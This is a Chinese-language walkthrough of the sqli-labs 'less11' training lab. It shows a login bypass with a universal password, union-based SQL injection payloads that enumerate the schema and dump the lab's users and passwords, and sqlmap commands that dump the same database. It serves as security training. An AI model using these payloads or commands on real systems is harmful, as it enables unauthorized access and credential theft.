---
title: less11
url: https://www.yuque.com/u29002979/ep2zrx/ivhbtp8cseozy69t
---

![image.png](../../assets/ivhbtp8cseozy69t/1668574343567-9abdcb38-18af-4797-98c2-2073d26d484d.png)
发现是一个登录页面
`1'`单引号闭合
使用万能密码。
username输入`admin' or 1-- +`成功登录. <a name="VnzYl"></a>

# 联合查询

<a name="tFdi3"></a>

## 查询字段数

`1' order by 3-- +`

> 登录后页面报错Unknown column '3' in 'order clause'

`1' order by 2-- +`
没有提示错误，说明有2个字段；

<a name="CeMCs"></a>

## 判断回显点

`1' union select 1,2 #`
显示1，2。判断出页面有两个显示位；

<a name="ECWHT"></a>

## 爆数据库名

`1' union select 1,group_concat(schema_name) from information_schema.schemata #`

> Your Login name:1
> Your Password:information\_schema,challenges,dvwa\_com,mysql,performance\_schema,security,sql,sys

<a name="FvGKE"></a>

## 爆数据表名

`1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #`

> Your Login name:1
> Your Password:emails,referers,uagents,users

<a name="cr7p8"></a>

## 爆字段名

`1' union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' #`

> Your Login name:1
> Your Password:id,username,password

<a name="yyein"></a>

## 爆字段内容

`1' union select 1,(select group_concat(username,'^',password)from users) #`

>
> Your Login name:1
> Your Password:Dumb^Dumb,
> Angelina^I-kill-you,
> Dummy^p@ssword,
> secure^crappy,
> stupid^stupidity,
> superman^genious,
> batman^mob!le,
> admin^admin,
> admin1^admin1,
> admin2^admin2,
> admin3^admin3,
> dhakkan^dumbo,
> admin4^admin4

<a name="wCZkA"></a>

# sqlmap

```bash
启动sqlmap探测注入点
sqlmap -u ip --data="uname=admin&passwd=admin" --batch
爆破当前数据库名
sqlmap -u ip --data="uname=admin&passwd=admin" --batch --current-db
爆破数据表
sqlmap -u ip --data="uname=admin&passwd=admin" --batch -D security --tables
最后脱库
sqlmap -u ip --data="uname=admin&passwd=admin" --batch -D security -T users --dump
```

<a name="ngc5z"></a>

## 或者将抓包内容保存到.txt文件中

```bash
sqlmap.py -r 1.txt -p 'uname' --batch
爆破数据库
sqlmap.py -r 1.txt -p 'uname' --batch --current-db
爆破表
sqlmap.py -r 1.txt -p 'uname' --batch -D security --tables
脱库
sqlmap.py -r 1.txt -p 'uname' --batch -D security --dump
```
